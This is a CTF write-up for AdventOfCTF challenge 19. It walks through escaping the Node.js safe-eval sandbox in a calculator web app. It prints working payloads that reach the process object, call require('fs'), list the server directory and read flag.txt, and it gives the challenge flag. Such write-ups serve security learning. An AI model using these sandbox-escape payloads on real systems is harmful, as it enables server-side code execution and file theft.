+++
author = "Maik de Kruif"
title = "Challenge 19"
subtitle = "Challenge 19 - AdventOfCTF"
date = 2021-02-25T23:18:28+01:00
description = "A writeup for challenge 19 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/d80f13d1ab714f7864c2a9ef56c5f767.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "javascipt",
    "nodejs",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1900

## Description

We found out that it was possible to insert Javascript code in the calculator. Oops! We found an awesome module to prevent against this abuse. Hopefully it is all better now. The flag is in flag.txt.

Visit <https://19.adventofctf.com> to start the challenge.

## Recon

Upon opening the challenge website, we're greeted with an input field which asks us to "enter the nr of days until christmas".

When opening the source of the page we also find some javascript code:

```js
function send() {
  let calc = $("#calc")[0].value;
  if (calc.length > 0) {
    $.ajax({
      url: "/calc",
      type: "POST",
      data: '{"calc": "' + calc + '" }',
      contentType: "application/json; charset=utf-8",
      dataType: "json",
    }).always(function (data) {
      text = data;
      if (data.responseText) {
        text = data.responseText;
      }
      $("#msg")[0].innerHTML = "<b>" + text + "</b>";
    });
  }
}
```

As the description tells us it's a calculator, let's try entering `3+4` in the input field. It will make a `POST` request to `/calc`, which will return `7`.

The description also states it was possible to enter javascript code, which we saw in the [previous challenge]({{% ref "writeups/adventofctf/2020/challenge_18.md" %}}), but that it has been fixed now.

## Finding the vulnerability

To verify what the description says, let's try to enter `res` in the input field. Sadly, it looks like it actually has been fixed as we now get the following error:

```text
evalmachine.<anonymous>:11
  SAFE_EVAL_521493=res
  ^

ReferenceError: res is not defined
    at evalmachine.<anonymous>:11:3
    at Script.runInContext (vm.js:133:20)
    at Script.runInNewContext (vm.js:139:17)
    at Object.runInNewContext (vm.js:322:38)
    at safeEval (/opt/app/node_modules/safe-eval/index.js:24:6)
    at /opt/app/server.js:13:11
    at Layer.handle [as handle_request] (/opt/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/opt/app/node_modules/express/lib/router/route.js:137:13)
    at /opt/app/node_modules/body-parser/lib/read.js:130:5
    at invokeCallback (/opt/app/node_modules/raw-body/index.js:224:16)
```

When looking at this output, we can see that it uses the `safe-eval` module to evaluate the input.

I personally don't know this module so let's Google around a bit. Eventually, I found [this Github Issue](https://github.com/hacksparrow/safe-eval/issues/16#issuecomment-554301596) which talks about safe-eval not being so safe. Exactly what we need.

When scrolling down on the issue, we can see a comment with the following code:

```text
(
delete(this.constructor.constructor),delete(this.constructor),
this.constructor.constructor("return process")()
)
```

_Note: Sorry this code is not highlighted. If I do so, my formatter will mess it up..._

The comment has no further text in it so let's try entering the code. Don't forget to replace the double quotes (`"`) with single ones (`'`) though as, otherwise, the JSON will no longer be valid.

After making the request, the server returns the following string: `[object process]`. This means the code worked, and we can build an exploit on it.

## Exploit

Because we now have the `process` object, we can use it to require modules and execute code.

To read the directory contents of the sever, we can use the following code:

```text
(() => {
  const process =
    (delete this.constructor.constructor,
    delete this.constructor,
    this.constructor.constructor('return process')());
  const require = process.mainModule.require;
  const fs = require('fs');
  return fs.readdirSync('.');
})();
```

_Note: Again, not formatted as my formatter will replace the single quotes with double ones._

In this code, I used the `process` to get the `require` function. I did this so I could get access to the `fs` module to read the directory contents. This, in turn, is all wrapped by a [self-executing anonymous function](https://developer.mozilla.org/en-US/docs/Glossary/Self-Executing_Anonymous_Function) so I could use variables to make it easier.

The above code returns the following output:

```text
flag.txt,node_modules,package-lock.json,package.json,public,server.js
```

Here we see the `flag.txt` file. Now let's read it using the `fs` module again:

```text
(() => {
  const process =
    (delete this.constructor.constructor,
    delete this.constructor,
    this.constructor.constructor('return process')());
  const require = process.mainModule.require;
  const fs = require('fs');
  return fs.readFileSync('flag.txt');
})();
```

## Solution

We got the flag! It is `NOVI{s@fe_eval_is_not_so_saf3}`.
